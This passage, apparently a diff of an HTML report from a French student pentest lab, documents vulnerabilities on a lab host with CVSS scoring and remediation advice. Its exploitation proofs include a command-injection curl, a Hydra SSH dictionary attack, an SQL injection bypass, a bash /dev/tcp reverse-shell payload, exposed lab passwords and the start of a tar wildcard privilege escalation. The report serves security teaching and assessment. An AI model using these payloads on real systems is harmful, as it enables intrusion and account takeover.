+        <td>Kali → User J / John</td>
+        <td>6,4</td>
+        <td class="risk-medium">Modéré</td>
+        <td>Non confirmée</td>
+      </tr>
+      <tr>
+        <td><strong>VULN 03</strong></td>
+        <td>FTP anonyme exposant une clé privée SSH</td>
+        <td>Kali → User A / Alice</td>
+        <td>7,5</td>
+        <td class="risk-high">Élevé</td>
+        <td>Confirmée</td>
+      </tr>
+      <tr>
+        <td><strong>VULN 04</strong></td>
+        <td>Injection SQL</td>
+        <td>Kali → User B / Bob</td>
+        <td>6,4</td>
+        <td class="risk-medium">Modéré</td>
+        <td>Confirmée</td>
+      </tr>
+      <tr>
+        <td><strong>VULN 05</strong></td>
+        <td>Divulgation d’identifiants</td>
+        <td>User W / www-data → User J / John</td>
+        <td>5,5</td>
+        <td class="risk-medium">Modéré</td>
+        <td>Confirmée</td>
+      </tr>
+      <tr>
+        <td><strong>VULN 06</strong></td>
+        <td>Tar Wildcard Injection</td>
+        <td>User J / John → User R / Root</td>
+        <td>9</td>
+        <td class="risk-high">Élevé</td>
+        <td>Confirmée</td>
+      </tr>
+      <tr>
+        <td><strong>VULN 07</strong></td>
+        <td>Mauvaise configuration sudo</td>
+        <td>User A / Alice → User R / Root</td>
+        <td>9</td>
+        <td class="risk-high">Élevé</td>
+        <td>Confirmée</td>
+      </tr>
+      <tr>
+        <td><strong>VULN 08</strong></td>
+        <td>Binaire SUID dangereux</td>
+        <td>User B / Bob → User R / Root</td>
+        <td>9</td>
+        <td class="risk-high">Élevé</td>
+        <td>Confirmée</td>
+      </tr>
+      <tr>
+        <td><strong>VULN 09</strong></td>
+        <td>Accès Root alternatif</td>
+        <td>Kali → User R / Root</td>
+        <td>N/A</td>
+        <td class="risk-na">Non calculable</td>
+        <td>Non confirmée</td>
+      </tr></tbody>
+    </table>
+    <div class="notice warning">
+      <strong>Priorisation.</strong> Les élévations VULN-06, VULN-07 et VULN-08 obtiennent les scores les plus élevés dans le contexte imposé du TP. Les points d’entrée distants doivent néanmoins être corrigés conjointement pour casser les chaînes complètes.
+    </div>
+  </section>
+
+  
+    <section id="vuln-01" class="vulnerability page-break">
+      <div class="section-tag">FICHE 01 · VULN 01</div>
+      <h2>VULN 01 — Command Injection</h2>
+      <table class="identity-table">
+        <tr>
+          <th>Criticité audit</th><td>Critique</td>
+          <th>Statut</th><td>Confirmée</td>
+        </tr>
+        <tr>
+          <th>Chemin du schéma</th><td>Kali → User W / www-data</td>
+          <th>Service</th><td>PINGOZAURUS · HTTP</td>
+        </tr>
+        <tr>
+          <th>Prérequis</th><td>Accès réseau à l’application PINGOZAURUS</td>
+          <th>Compte obtenu</th><td>www-data</td>
+        </tr>
+      </table>
+      
+
+      <h3>Description technique</h3>
+      <p>L’application web PINGOZAURUS construit directement une commande ping à partir de la saisie utilisateur avec exec(), sans validation ni échappement. Un séparateur shell permet donc d’injecter et d’exécuter une commande système arbitraire.</p>
+
+      <h3>Preuve d’exploitation</h3>
+      <pre>curl -X POST http://10.10.10.83/ --data-urlencode &quot;command=localhost -c 1;id&quot;
+# Résultat : uid=33(www-data)</pre>
+
+      <h3>Impact</h3>
+      <p>Exécution de commandes arbitraires sur le serveur et obtention d’un shell avec les privilèges de www-data.</p>
+
+      <h3>Recommandations</h3>
+      <ul><li>Utiliser spawn() ou execFile() à la place de exec().</li><li>Passer les arguments sous forme de tableau.</li><li>Valider strictement les entrées utilisateur.</li><li>Ne jamais construire une commande shell par concaténation.</li></ul>
+
+      <div class="cvss-block">
+        <div class="cvss-heading">
+          <div>
+            <span>ÉVALUATION DU RISQUE</span>
+            <h3>CVSS v2 — score de base</h3>
+          </div>
+          <div class="score risk-high">
+            <strong>7,5</strong>
+            <small>Élevé</small>
+          </div>
+        </div>
+        <p class="vector"><strong>Vecteur :</strong> <code>AV:N/AC:L/Au:N/C:P/I:P/A:P</code></p>
+        <p class="rationale">Exploitation distante, faible complexité, sans authentification. Les impacts restent partiels car le premier shell obtenu est limité à www-data.</p>
+        <div class="matrix-layout">
+          <div>
+    <table class="risk-matrix">
+      <caption>Matrice Impact × Exploitabilité</caption>
+      <thead>
+        <tr><th>Impact ↑</th><th>0</th><th>2</th><th>4</th><th>6</th><th>8</th><th>10</th></tr>
+      </thead>
+      <tbody><tr><th>10</th><td class="matrix-medium"></td><td class="matrix-medium"></td><td class="matrix-high"></td><td class="matrix-high"></td><td class="matrix-high"></td><td class="matrix-high"></td></tr><tr><th>8</th><td class="matrix-medium"></td><td class="matrix-medium"></td><td class="matrix-medium"></td><td class="matrix-high"></td><td class="matrix-high"></td><td class="matrix-high"></td></tr><tr><th>6</th><td class="matrix-low"></td><td class="matrix-medium"></td><td class="matrix-medium"></td><td class="matrix-medium"></td><td class="matrix-high"></td><td class="matrix-high"><span class="matrix-point">7.5</span></td></tr><tr><th>4</th><td class="matrix-low"></td><td class="matrix-low"></td><td class="matrix-medium"></td><td class="matrix-medium"></td><td class="matrix-medium"></td><td class="matrix-high"></td></tr><tr><th>2</th><td class="matrix-low"></td><td class="matrix-low"></td><td class="matrix-low"></td><td class="matrix-medium"></td><td class="matrix-medium"></td><td class="matrix-medium"></td></tr><tr><th>0</th><td class="matrix-low"></td><td class="matrix-low"></td><td class="matrix-low"></td><td class="matrix-low"></td><td class="matrix-medium"></td><td class="matrix-medium"></td></tr></tbody>
+      <tfoot><tr><th></th><th colspan="6">Exploitabilité →</th></tr></tfoot>
+    </table></div>
+          <div>
+    <table class="metrics-table">
+      <thead><tr><th>Code</th><th>Métrique</th><th>Valeur</th><th>Coefficient</th></tr></thead>
+      <tbody>
+        <tr>
+          <td><strong>AV</strong></td>
+          <td>Vecteur d’accès</td>
+          <td>Réseau</td>
+          <td>1</td>
+        </tr>
+        <tr>
+          <td><strong>AC</strong></td>
+          <td>Complexité d’accès</td>
+          <td>Faible</td>
+          <td>0,71</td>
+        </tr>
+        <tr>
+          <td><strong>Au</strong></td>
+          <td>Authentification</td>
+          <td>Aucune</td>
+          <td>0,704</td>
+        </tr>
+        <tr>
+          <td><strong>C</strong></td>
+          <td>Confidentialité</td>
+          <td>Partiel</td>
+          <td>0,275</td>
+        </tr>
+        <tr>
+          <td><strong>I</strong></td>
+          <td>Intégrité</td>
+          <td>Partiel</td>
+          <td>0,275</td>
+        </tr>
+        <tr>
+          <td><strong>A</strong></td>
+          <td>Disponibilité</td>
+          <td>Partiel</td>
+          <td>0,275</td>
+        </tr></tbody>
+    </table></div>
+        </div>
+        
+    <div class="calculation">
+      <p><strong>Impact</strong><br>
+      <code>10,41 × [1 − (1−0,275) × (1−0,275) × (1−0,275)]</code>
+      <span>= 6,4</span></p>
+      <p><strong>Exploitabilité</strong><br>
+      <code>20 × 1 × 0,71 × 0,704</code>
+      <span>= 10</span></p>
+      <p><strong>Score de base</strong><br>
+      <code>[(0,6 × 6,4) + (0,4 × 10) − 1,5] × 1,176</code>
+      <span>= 7,5 / 10</span></p>
+    </div>
+      </div>
+    </section>
+    <section id="vuln-02" class="vulnerability page-break">
+      <div class="section-tag">FICHE 02 · VULN 02</div>
+      <h2>VULN 02 — Attaque par dictionnaire SSH</h2>
+      <table class="identity-table">
+        <tr>
+          <th>Criticité audit</th><td>À confirmer</td>
+          <th>Statut</th><td>Non confirmée</td>
+        </tr>
+        <tr>
+          <th>Chemin du schéma</th><td>Kali → User J / John</td>
+          <th>Service</th><td>SSH</td>
+        </tr>
+        <tr>
+          <th>Prérequis</th><td>Accès réseau au service SSH — validation encore requise</td>
+          <th>Compte obtenu</th><td>John · validation en attente</td>
+        </tr>
+      </table>
+      <div class="notice warning"><strong>Scoring provisoire.</strong> La méthode Hydra doit être reproduite avant de confirmer VULN-02.</div>
+
+      <h3>Description technique</h3>
+      <p>Le chemin alternatif vers John peut correspondre à une attaque par dictionnaire contre SSH. Le mot de passe peterpan étant présent dans rockyou.txt, Hydra doit pouvoir l’identifier. La vulnérabilité restera non confirmée jusqu’à l’observation d’un résultat positif et la validation d’une connexion SSH.</p>
+
+      <h3>Preuve d’exploitation</h3>
+      <pre>Étape 1 — Lancer l’attaque par dictionnaire
+hydra -l john -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.83 -t 4 -I
+
+Résultat attendu
+[22][ssh] host: 10.10.10.83   login: john   password: peterpan
+
+Étape 2 — Valider les identifiants découverts
+ssh john@10.10.10.83
+# Mot de passe : peterpan
+
+Étape 3 — Confirmer l’identité obtenue
+whoami
+id
+# La vulnérabilité sera confirmée si la session John est ouverte</pre>
+
+      <h3>Impact</h3>
+      <p>Si le test réussit, un attaquant peut compromettre directement John depuis le réseau puis exploiter VULN-06 pour élever ses privilèges jusqu’à Root.</p>
+
+      <h3>Recommandations</h3>
+      <ul><li>Utiliser un mot de passe long, unique et absent des dictionnaires publics.</li><li>Privilégier l’authentification SSH par clé et désactiver les mots de passe.</li><li>Limiter les tentatives avec Fail2ban ou un mécanisme équivalent.</li><li>Conserver le statut non confirmé tant que le test n’est pas reproduit.</li></ul>
+
+      <div class="cvss-block">
+        <div class="cvss-heading">
+          <div>
+            <span>ÉVALUATION DU RISQUE</span>
+            <h3>CVSS v2 — score de base</h3>
+          </div>
+          <div class="score risk-medium">
+            <strong>6,4</strong>
+            <small>Modéré</small>
+          </div>
+        </div>
+        <p class="vector"><strong>Vecteur :</strong> <code>AV:N/AC:L/Au:N/C:P/I:P/A:N</code></p>
+        <p class="rationale">Estimation provisoire : attaque distante, faible complexité et sans authentification préalable. Les impacts correspondent à la compromission du compte John.</p>
+        <div class="matrix-layout">
+          <div>
+    <table class="risk-matrix">
+      <caption>Matrice Impact × Exploitabilité</caption>
+      <thead>
+        <tr><th>Impact ↑</th><th>0</th><th>2</th><th>4</th><th>6</th><th>8</th><th>10</th></tr>
+      </thead>
+      <tbody><tr><th>10</th><td class="matrix-medium"></td><td class="matrix-medium"></td><td class="matrix-high"></td><td class="matrix-high"></td><td class="matrix-high"></td><td class="matrix-high"></td></tr><tr><th>8</th><td class="matrix-medium"></td><td class="matrix-medium"></td><td class="matrix-medium"></td><td class="matrix-high"></td><td class="matrix-high"></td><td class="matrix-high"></td></tr><tr><th>6</th><td class="matrix-low"></td><td class="matrix-medium"></td><td class="matrix-medium"></td><td class="matrix-medium"></td><td class="matrix-high"></td><td class="matrix-high"></td></tr><tr><th>4</th><td class="matrix-low"></td><td class="matrix-low"></td><td class="matrix-medium"></td><td class="matrix-medium"></td><td class="matrix-medium"></td><td class="matrix-high"><span class="matrix-point">6.4</span></td></tr><tr><th>2</th><td class="matrix-low"></td><td class="matrix-low"></td><td class="matrix-low"></td><td class="matrix-medium"></td><td class="matrix-medium"></td><td class="matrix-medium"></td></tr><tr><th>0</th><td class="matrix-low"></td><td class="matrix-low"></td><td class="matrix-low"></td><td class="matrix-low"></td><td class="matrix-medium"></td><td class="matrix-medium"></td></tr></tbody>
+      <tfoot><tr><th></th><th colspan="6">Exploitabilité →</th></tr></tfoot>
+    </table></div>
+          <div>
+    <table class="metrics-table">
+      <thead><tr><th>Code</th><th>Métrique</th><th>Valeur</th><th>Coefficient</th></tr></thead>
+      <tbody>
+        <tr>
+          <td><strong>AV</strong></td>
+          <td>Vecteur d’accès</td>
+          <td>Réseau</td>
+          <td>1</td>
+        </tr>
+        <tr>
+          <td><strong>AC</strong></td>
+          <td>Complexité d’accès</td>
+          <td>Faible</td>
+          <td>0,71</td>
+        </tr>
+        <tr>
+          <td><strong>Au</strong></td>
+          <td>Authentification</td>
+          <td>Aucune</td>
+          <td>0,704</td>
+        </tr>
+        <tr>
+          <td><strong>C</strong></td>
+          <td>Confidentialité</td>
+          <td>Partiel</td>
+          <td>0,275</td>
+        </tr>
+        <tr>
+          <td><strong>I</strong></td>
+          <td>Intégrité</td>
+          <td>Partiel</td>
+          <td>0,275</td>
+        </tr>
+        <tr>
+          <td><strong>A</strong></td>
+          <td>Disponibilité</td>
+          <td>Aucun</td>
+          <td>0</td>
+        </tr></tbody>
+    </table></div>
+        </div>
+        
+    <div class="calculation">
+      <p><strong>Impact</strong><br>
+      <code>10,41 × [1 − (1−0,275) × (1−0,275) × (1−0)]</code>
+      <span>= 4,9</span></p>
+      <p><strong>Exploitabilité</strong><br>
+      <code>20 × 1 × 0,71 × 0,704</code>
+      <span>= 10</span></p>
+      <p><strong>Score de base</strong><br>
+      <code>[(0,6 × 4,9) + (0,4 × 10) − 1,5] × 1,176</code>
+      <span>= 6,4 / 10</span></p>
+    </div>
+      </div>
+    </section>
+    <section id="vuln-03" class="vulnerability page-break">
+      <div class="section-tag">FICHE 03 · VULN 03</div>
+      <h2>VULN 03 — FTP anonyme exposant une clé privée SSH</h2>
+      <table class="identity-table">
+        <tr>
+          <th>Criticité audit</th><td>Critique</td>
+          <th>Statut</th><td>Confirmée</td>
+        </tr>
+        <tr>
+          <th>Chemin du schéma</th><td>Kali → User A / Alice</td>
+          <th>Service</th><td>FTP anonyme · SSH</td>
+        </tr>
+        <tr>
+          <th>Prérequis</th><td>Accès réseau au service FTP</td>
+          <th>Compte obtenu</th><td>Alice</td>
+        </tr>
+      </table>
+      
+
+      <h3>Description technique</h3>
+      <p>Le serveur FTP autorise une authentification anonyme et expose une clé privée SSH appartenant au compte Alice. Cette clé permet d’ouvrir une session SSH complète avec son identité.</p>
+
+      <h3>Preuve d’exploitation</h3>
+      <pre>ftp anonymous@10.10.10.83
+# Télécharger id_rsa
+chmod 600 id_rsa
+ssh -i id_rsa alice@10.10.10.83</pre>
+
+      <h3>Impact</h3>
+      <p>Compromission complète du compte Alice et accès interactif au serveur via SSH.</p>
+
+      <h3>Recommandations</h3>
+      <ul><li>Désactiver l’accès FTP anonyme.</li><li>Ne jamais stocker de clés privées sur un service publiquement accessible.</li><li>Restreindre les permissions des fichiers sensibles.</li></ul>
+
+      <div class="cvss-block">
+        <div class="cvss-heading">
+          <div>
+            <span>ÉVALUATION DU RISQUE</span>
+            <h3>CVSS v2 — score de base</h3>
+          </div>
+          <div class="score risk-high">
+            <strong>7,5</strong>
+            <small>Élevé</small>
+          </div>
+        </div>
+        <p class="vector"><strong>Vecteur :</strong> <code>AV:N/AC:L/Au:N/C:P/I:P/A:P</code></p>
+        <p class="rationale">La clé est récupérable à distance sans authentification forte. L’accès Alice entraîne des impacts partiels sur les trois propriétés de sécurité.</p>
+        <div class="matrix-layout">
+          <div>
+    <table class="risk-matrix">
+      <caption>Matrice Impact × Exploitabilité</caption>
+      <thead>
+        <tr><th>Impact ↑</th><th>0</th><th>2</th><th>4</th><th>6</th><th>8</th><th>10</th></tr>
+      </thead>
+      <tbody><tr><th>10</th><td class="matrix-medium"></td><td class="matrix-medium"></td><td class="matrix-high"></td><td class="matrix-high"></td><td class="matrix-high"></td><td class="matrix-high"></td></tr><tr><th>8</th><td class="matrix-medium"></td><td class="matrix-medium"></td><td class="matrix-medium"></td><td class="matrix-high"></td><td class="matrix-high"></td><td class="matrix-high"></td></tr><tr><th>6</th><td class="matrix-low"></td><td class="matrix-medium"></td><td class="matrix-medium"></td><td class="matrix-medium"></td><td class="matrix-high"></td><td class="matrix-high"><span class="matrix-point">7.5</span></td></tr><tr><th>4</th><td class="matrix-low"></td><td class="matrix-low"></td><td class="matrix-medium"></td><td class="matrix-medium"></td><td class="matrix-medium"></td><td class="matrix-high"></td></tr><tr><th>2</th><td class="matrix-low"></td><td class="matrix-low"></td><td class="matrix-low"></td><td class="matrix-medium"></td><td class="matrix-medium"></td><td class="matrix-medium"></td></tr><tr><th>0</th><td class="matrix-low"></td><td class="matrix-low"></td><td class="matrix-low"></td><td class="matrix-low"></td><td class="matrix-medium"></td><td class="matrix-medium"></td></tr></tbody>
+      <tfoot><tr><th></th><th colspan="6">Exploitabilité →</th></tr></tfoot>
+    </table></div>
+          <div>
+    <table class="metrics-table">
+      <thead><tr><th>Code</th><th>Métrique</th><th>Valeur</th><th>Coefficient</th></tr></thead>
+      <tbody>
+        <tr>
+          <td><strong>AV</strong></td>
+          <td>Vecteur d’accès</td>
+          <td>Réseau</td>
+          <td>1</td>
+        </tr>
+        <tr>
+          <td><strong>AC</strong></td>
+          <td>Complexité d’accès</td>
+          <td>Faible</td>
+          <td>0,71</td>
+        </tr>
+        <tr>
+          <td><strong>Au</strong></td>
+          <td>Authentification</td>
+          <td>Aucune</td>
+          <td>0,704</td>
+        </tr>
+        <tr>
+          <td><strong>C</strong></td>
+          <td>Confidentialité</td>
+          <td>Partiel</td>
+          <td>0,275</td>
+        </tr>
+        <tr>
+          <td><strong>I</strong></td>
+          <td>Intégrité</td>
+          <td>Partiel</td>
+          <td>0,275</td>
+        </tr>
+        <tr>
+          <td><strong>A</strong></td>
+          <td>Disponibilité</td>
+          <td>Partiel</td>
+          <td>0,275</td>
+        </tr></tbody>
+    </table></div>
+        </div>
+        
+    <div class="calculation">
+      <p><strong>Impact</strong><br>
+      <code>10,41 × [1 − (1−0,275) × (1−0,275) × (1−0,275)]</code>
+      <span>= 6,4</span></p>
+      <p><strong>Exploitabilité</strong><br>
+      <code>20 × 1 × 0,71 × 0,704</code>
+      <span>= 10</span></p>
+      <p><strong>Score de base</strong><br>
+      <code>[(0,6 × 6,4) + (0,4 × 10) − 1,5] × 1,176</code>
+      <span>= 7,5 / 10</span></p>
+    </div>
+      </div>
+    </section>
+    <section id="vuln-04" class="vulnerability page-break">
+      <div class="section-tag">FICHE 04 · VULN 04</div>
+      <h2>VULN 04 — Injection SQL</h2>
+      <table class="identity-table">
+        <tr>
+          <th>Criticité audit</th><td>Critique</td>
+          <th>Statut</th><td>Confirmée</td>
+        </tr>
+        <tr>
+          <th>Chemin du schéma</th><td>Kali → User B / Bob</td>
+          <th>Service</th><td>EvilCorp Web · HTTP 8081</td>
+        </tr>
+        <tr>
+          <th>Prérequis</th><td>Accès réseau à EvilCorp Web sur le port 8081</td>
+          <th>Compte obtenu</th><td>Bob</td>
+        </tr>
+      </table>
+      
+
+      <h3>Description technique</h3>
+      <p>Le formulaire /login construit sa requête SQL par concaténation. Une condition toujours vraie injectée dans username contourne l’authentification et ouvre le panneau d’administration, où une note interne divulgue le mot de passe de Bob.</p>
+
+      <h3>Preuve d’exploitation</h3>
+      <pre>Étape 1 — Vérifier le mécanisme d’authentification
+curl -X POST http://10.10.10.83:8081/login \
+  -d &quot;username=test&amp;password=test&quot;
+# Résultat : Invalid credentials
+
+Étape 2 — Injecter une condition SQL toujours vraie
+curl -X POST http://10.10.10.83:8081/login \
+  --data-urlencode &quot;username=' OR 1=1 -- &quot; \
+  --data-urlencode &quot;password=test&quot;
+
+# Requête résultante
+SELECT * FROM users WHERE username='' OR 1=1 -- ' AND password='test'
+
+Étape 3 — Accéder au panneau d’administration
+# Authentification contournée
+# Mot de passe divulgué : Bob / xNfE98RSsa
+
+Étape 4 — Ouvrir une session SSH
+ssh bob@10.10.10.83
+# Mot de passe : xNfE98RSsa
+
+Étape 5 — Confirmer l’identité obtenue
+whoami
+id
+# Shell interactif sous l’identité de Bob</pre>
+
+      <h3>Impact</h3>
+      <p>Contournement complet de l’authentification, exposition d’informations confidentielles et compromission du compte Bob, ouvrant la voie à l’élévation Root via VULN-08.</p>
+
+      <h3>Recommandations</h3>
+      <ul><li>Utiliser exclusivement des requêtes préparées ou un ORM sûr.</li><li>Valider et filtrer toutes les entrées côté serveur.</li><li>Limiter les privilèges du compte de base de données.</li><li>Ne jamais afficher de mots de passe ou d’identifiants sensibles dans l’interface.</li></ul>
+
+      <div class="cvss-block">
+        <div class="cvss-heading">
+          <div>
+            <span>ÉVALUATION DU RISQUE</span>
+            <h3>CVSS v2 — score de base</h3>
+          </div>
+          <div class="score risk-medium">
+            <strong>6,4</strong>
+            <small>Modéré</small>
+          </div>
+        </div>
+        <p class="vector"><strong>Vecteur :</strong> <code>AV:N/AC:L/Au:N/C:P/I:P/A:N</code></p>
+        <p class="rationale">Injection exploitable à distance sans authentification. L’accès à Bob affecte la confidentialité et l’intégrité, sans effet direct démontré sur la disponibilité.</p>
+        <div class="matrix-layout">
+          <div>
+    <table class="risk-matrix">
+      <caption>Matrice Impact × Exploitabilité</caption>
+      <thead>
+        <tr><th>Impact ↑</th><th>0</th><th>2</th><th>4</th><th>6</th><th>8</th><th>10</th></tr>
+      </thead>
+      <tbody><tr><th>10</th><td class="matrix-medium"></td><td class="matrix-medium"></td><td class="matrix-high"></td><td class="matrix-high"></td><td class="matrix-high"></td><td class="matrix-high"></td></tr><tr><th>8</th><td class="matrix-medium"></td><td class="matrix-medium"></td><td class="matrix-medium"></td><td class="matrix-high"></td><td class="matrix-high"></td><td class="matrix-high"></td></tr><tr><th>6</th><td class="matrix-low"></td><td class="matrix-medium"></td><td class="matrix-medium"></td><td class="matrix-medium"></td><td class="matrix-high"></td><td class="matrix-high"></td></tr><tr><th>4</th><td class="matrix-low"></td><td class="matrix-low"></td><td class="matrix-medium"></td><td class="matrix-medium"></td><td class="matrix-medium"></td><td class="matrix-high"><span class="matrix-point">6.4</span></td></tr><tr><th>2</th><td class="matrix-low"></td><td class="matrix-low"></td><td class="matrix-low"></td><td class="matrix-medium"></td><td class="matrix-medium"></td><td class="matrix-medium"></td></tr><tr><th>0</th><td class="matrix-low"></td><td class="matrix-low"></td><td class="matrix-low"></td><td class="matrix-low"></td><td class="matrix-medium"></td><td class="matrix-medium"></td></tr></tbody>
+      <tfoot><tr><th></th><th colspan="6">Exploitabilité →</th></tr></tfoot>
+    </table></div>
+          <div>
+    <table class="metrics-table">
+      <thead><tr><th>Code</th><th>Métrique</th><th>Valeur</th><th>Coefficient</th></tr></thead>
+      <tbody>
+        <tr>
+          <td><strong>AV</strong></td>
+          <td>Vecteur d’accès</td>
+          <td>Réseau</td>
+          <td>1</td>
+        </tr>
+        <tr>
+          <td><strong>AC</strong></td>
+          <td>Complexité d’accès</td>
+          <td>Faible</td>
+          <td>0,71</td>
+        </tr>
+        <tr>
+          <td><strong>Au</strong></td>
+          <td>Authentification</td>
+          <td>Aucune</td>
+          <td>0,704</td>
+        </tr>
+        <tr>
+          <td><strong>C</strong></td>
+          <td>Confidentialité</td>
+          <td>Partiel</td>
+          <td>0,275</td>
+        </tr>
+        <tr>
+          <td><strong>I</strong></td>
+          <td>Intégrité</td>
+          <td>Partiel</td>
+          <td>0,275</td>
+        </tr>
+        <tr>
+          <td><strong>A</strong></td>
+          <td>Disponibilité</td>
+          <td>Aucun</td>
+          <td>0</td>
+        </tr></tbody>
+    </table></div>
+        </div>
+        
+    <div class="calculation">
+      <p><strong>Impact</strong><br>
+      <code>10,41 × [1 − (1−0,275) × (1−0,275) × (1−0)]</code>
+      <span>= 4,9</span></p>
+      <p><strong>Exploitabilité</strong><br>
+      <code>20 × 1 × 0,71 × 0,704</code>
+      <span>= 10</span></p>
+      <p><strong>Score de base</strong><br>
+      <code>[(0,6 × 4,9) + (0,4 × 10) − 1,5] × 1,176</code>
+      <span>= 6,4 / 10</span></p>
+    </div>
+      </div>
+    </section>
+    <section id="vuln-05" class="vulnerability page-break">
+      <div class="section-tag">FICHE 05 · VULN 05</div>
+      <h2>VULN 05 — Divulgation d’identifiants</h2>
+      <table class="identity-table">
+        <tr>
+          <th>Criticité audit</th><td>Élevée</td>
+          <th>Statut</th><td>Confirmée</td>
+        </tr>
+        <tr>
+          <th>Chemin du schéma</th><td>User W / www-data → User J / John</td>
+          <th>Service</th><td>Système de fichiers · SSH</td>
+        </tr>
+        <tr>
+          <th>Prérequis</th><td>Shell www-data obtenu via VULN-01</td>
+          <th>Compte obtenu</th><td>John</td>
+        </tr>
+      </table>
+      
+
+      <h3>Description technique</h3>
+      <p>Après l’exploitation de la Command Injection sur PINGOZAURUS, un reverse shell est obtenu avec les privilèges de www-data. L’énumération du système permet ensuite d’identifier le fichier /run/john-script.sh, dont le contenu divulgue en clair le mot de passe du compte John.</p>
+
+      <h3>Preuve d’exploitation</h3>
+      <pre>Étape 1 — Démarrer le listener Netcat
+nc -lvnp 4444
+
+Étape 2 — Injecter le payload de reverse shell
+curl -X POST http://10.10.10.83/ \
+  --data-urlencode &quot;command=localhost -c 1; /bin/bash -c 'bash -i &gt;&amp; /dev/tcp/172.17.0.1/4444 0&gt;&amp;1'&quot;
+
+Étape 3 — Confirmer le contexte d’exécution
+whoami
+id
+pwd
+# Shell obtenu avec les privilèges de www-data
+
+Étape 4 — Énumérer les scripts et fichiers accessibles
+find / -name &quot;*.sh&quot; 2&gt;/dev/null
+find / -type f 2&gt;/dev/null
+
+Étape 5 — Lire le script découvert
+cat /run/john-script.sh
+
+Résultat
+PASSWD=&quot;peterpan&quot;
+
+Étape 6 — Ouvrir une session SSH avec le mot de passe découvert
+ssh john@10.10.10.83
+# Mot de passe : peterpan</pre>
+
+      <h3>Impact</h3>
+      <p>Divulgation d’un secret réutilisable permettant la compromission du compte John, étape préalable à l’élévation de privilèges via VULN-06.</p>
+
+      <h3>Recommandations</h3>
+      <ul><li>Stocker les secrets dans un gestionnaire dédié.</li><li>Utiliser des variables d’environnement sécurisées.</li><li>Ne jamais conserver de mots de passe en clair dans des scripts.</li></ul>
+
+      <div class="cvss-block">
+        <div class="cvss-heading">
+          <div>
+            <span>ÉVALUATION DU RISQUE</span>
+            <h3>CVSS v2 — score de base</h3>
+          </div>
+          <div class="score risk-medium">
+            <strong>5,5</strong>
+            <small>Modéré</small>
+          </div>
+        </div>
+        <p class="vector"><strong>Vecteur :</strong> <code>AV:N/AC:L/Au:S/C:P/I:P/A:N</code></p>
+        <p class="rationale">Dans le contexte du TP, la cible est considérée comme distante. Une authentification préalable sous www-data est requise avant la lecture du secret de John.</p>
+        <div class="matrix-layout">
+          <div>
+    <table class="risk-matrix">
+      <caption>Matrice Impact × Exploitabilité</caption>
+      <thead>
+        <tr><th>Impact ↑</th><th>0</th><th>2</th><th>4</th><th>6</th><th>8</th><th>10</th></tr>
+      </thead>
+      <tbody><tr><th>10</th><td class="matrix-medium"></td><td class="matrix-medium"></td><td class="matrix-high"></td><td class="matrix-high"></td><td class="matrix-high"></td><td class="matrix-high"></td></tr><tr><th>8</th><td class="matrix-medium"></td><td class="matrix-medium"></td><td class="matrix-medium"></td><td class="matrix-high"></td><td class="matrix-high"></td><td class="matrix-high"></td></tr><tr><th>6</th><td class="matrix-low"></td><td class="matrix-medium"></td><td class="matrix-medium"></td><td class="matrix-medium"></td><td class="matrix-high"></td><td class="matrix-high"></td></tr><tr><th>4</th><td class="matrix-low"></td><td class="matrix-low"></td><td class="matrix-medium"></td><td class="matrix-medium"></td><td class="matrix-medium"><span class="matrix-point">5.5</span></td><td class="matrix-high"></td></tr><tr><th>2</th><td class="matrix-low"></td><td class="matrix-low"></td><td class="matrix-low"></td><td class="matrix-medium"></td><td class="matrix-medium"></td><td class="matrix-medium"></td></tr><tr><th>0</th><td class="matrix-low"></td><td class="matrix-low"></td><td class="matrix-low"></td><td class="matrix-low"></td><td class="matrix-medium"></td><td class="matrix-medium"></td></tr></tbody>
+      <tfoot><tr><th></th><th colspan="6">Exploitabilité →</th></tr></tfoot>
+    </table></div>
+          <div>
+    <table class="metrics-table">
+      <thead><tr><th>Code</th><th>Métrique</th><th>Valeur</th><th>Coefficient</th></tr></thead>
+      <tbody>
+        <tr>
+          <td><strong>AV</strong></td>
+          <td>Vecteur d’accès</td>
+          <td>Réseau</td>
+          <td>1</td>
+        </tr>
+        <tr>
+          <td><strong>AC</strong></td>
+          <td>Complexité d’accès</td>
+          <td>Faible</td>
+          <td>0,71</td>
+        </tr>
+        <tr>
+          <td><strong>Au</strong></td>
+          <td>Authentification</td>
+          <td>Unique</td>
+          <td>0,56</td>
+        </tr>
+        <tr>
+          <td><strong>C</strong></td>
+          <td>Confidentialité</td>
+          <td>Partiel</td>
+          <td>0,275</td>
+        </tr>
+        <tr>
+          <td><strong>I</strong></td>
+          <td>Intégrité</td>
+          <td>Partiel</td>
+          <td>0,275</td>
+        </tr>
+        <tr>
+          <td><strong>A</strong></td>
+          <td>Disponibilité</td>
+          <td>Aucun</td>
+          <td>0</td>
+        </tr></tbody>
+    </table></div>
+        </div>
+        
+    <div class="calculation">
+      <p><strong>Impact</strong><br>
+      <code>10,41 × [1 − (1−0,275) × (1−0,275) × (1−0)]</code>
+      <span>= 4,9</span></p>
+      <p><strong>Exploitabilité</strong><br>
+      <code>20 × 1 × 0,71 × 0,56</code>
+      <span>= 8</span></p>
+      <p><strong>Score de base</strong><br>
+      <code>[(0,6 × 4,9) + (0,4 × 8) − 1,5] × 1,176</code>
+      <span>= 5,5 / 10</span></p>
+    </div>
+      </div>
+    </section>
+    <section id="vuln-06" class="vulnerability page-break">
+      <div class="section-tag">FICHE 06 · VULN 06</div>
+      <h2>VULN 06 — Tar Wildcard Injection</h2>
+      <table class="identity-table">
+        <tr>
+          <th>Criticité audit</th><td>Critique</td>
+          <th>Statut</th><td>Confirmée</td>
+        </tr>
+        <tr>
+          <th>Chemin du schéma</th><td>User J / John → User R / Root</td>
+          <th>Service</th><td>Tâche cron · tar</td>
+        </tr>
+        <tr>
+          <th>Prérequis</th><td>Compte John obtenu via VULN-05 ou VULN-02</td>
+          <th>Compte obtenu</th><td>Root</td>
+        </tr>
+      </table>
+      
+
+      <h3>Description technique</h3>
+      <p>Depuis le compte John, l’analyse de /etc/crontab révèle une sauvegarde exécutée par Root toutes les cinq minutes avec tar et le caractère *. Comme aucun -- ne sépare les options des fichiers, des noms commençant par -- sont interprétés comme des arguments GNU tar. Deux faux fichiers checkpoint permettent ainsi de faire exécuter un script arbitraire par la tâche cron avec les privilèges Root.</p>
+
+      <h3>Preuve d’exploitation</h3>
+      <pre>Étape 1 — Énumérer le compte John
+whoami
+id
+pwd
+ls -la
+sudo -l
+cat /etc/crontab
+
+# Tâche exécutée par Root toutes les 5 minutes
+cd /home/john/ &amp;&amp; tar -zcf /home-john-backup.tgz *
